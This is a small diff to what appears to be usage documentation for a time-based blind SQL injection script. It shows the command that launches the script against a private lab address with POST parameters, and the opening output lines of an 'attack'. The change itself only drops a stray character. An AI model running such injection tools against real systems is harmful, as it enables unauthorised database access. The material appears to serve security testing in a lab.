@@ -3,7 +3,7 @@
 python time_based_blind_sql_injection.py http://192.168.33.10/sqli/time_based_blind_escaped.php POST [\'to\',\'msg\'] [\'1\',\'\'] -l -t 4
 
 
-Starting attack on URL: http://192.168.33.10/sqli/time_based_blind_escaped.php #
+Starting attack on URL: http://192.168.33.10/sqli/time_based_blind_escaped.php
 
 Using 4 thread
 Average response time: 0.0136808163265 s
